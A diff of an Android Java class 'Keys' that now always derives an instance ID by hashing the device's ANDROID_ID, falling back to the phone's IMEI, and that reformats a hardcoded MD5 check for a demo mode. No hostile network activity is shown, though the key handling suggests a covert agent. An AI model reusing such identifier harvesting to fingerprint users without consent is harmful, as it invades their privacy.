@@ -57,10 +57,10 @@ public class Keys {
 	// Challenge key
 	/** The Constant g_Challenge. */
 	private static byte[] challengeKey;
-	
+
 	// Demo key
 	private static byte[] demoMode;
-	
+
 	/**
 	 * Self.
 	 * 
@@ -91,29 +91,29 @@ public class Keys {
 	}
 
 	protected Keys(boolean fromResources) {
+		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
+		if (androidId == null) {
+			androidId = "EMPTY";
+		}
+
+		if (Messages.getString("20.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
+			// http://code.google.com/p/android/issues/detail?id=10603
+			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
+			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+					Context.TELEPHONY_SERVICE);
+
+			final String imei = telephonyManager.getDeviceId();
+			androidId = imei;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (Keys), androidId: " + androidId);
+		}
+
+		instanceId = Digest.SHA1(androidId.getBytes());
+
 		if (fromResources) {
 			final Resources resources = Status.getAppContext().getResources();
-
-			String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
-			if(androidId==null){
-				androidId="EMPTY";
-			}
-
-			if (Messages.getString("20.0").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
-				// http://code.google.com/p/android/issues/detail?id=10603
-				// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
-				final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
-						Context.TELEPHONY_SERVICE);
-
-				final String imei = telephonyManager.getDeviceId();
-				androidId = imei;
-			}
-			
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (Keys), androidId: " + androidId);
-			}
-
-			instanceId = Digest.SHA1(androidId.getBytes());
 
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
 
@@ -131,7 +131,7 @@ public class Keys {
 				Check.log(TAG + " instanceId: " + Utils.byteArrayToHex(instanceId));//$NON-NLS-1$
 				Check.log(TAG + " demoMode: " + Utils.byteArrayToHex(demoMode));//$NON-NLS-1$
 			}
-			
+
 			if (isDemo()) {
 				Cfg.DEMO = true;
 			}
@@ -139,19 +139,18 @@ public class Keys {
 	}
 
 	public boolean isDemo() {
-		byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba,
-            (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39, (byte) 0xdb,
-            (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
-            (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };
-		
+		byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba, (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39,
+				(byte) 0xdb, (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a, (byte) 0x58, (byte) 0xd5,
+				(byte) 0x2c, (byte) 0x52 };
+
 		byte[] calculated = Digest.MD5(demoMode);
-		
+
 		boolean ret = Arrays.equals(calculated, demoDigest);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (isDemo): " + ret); //$NON-NLS-1$
 		}
-		
+
 		return ret;
 	}
 
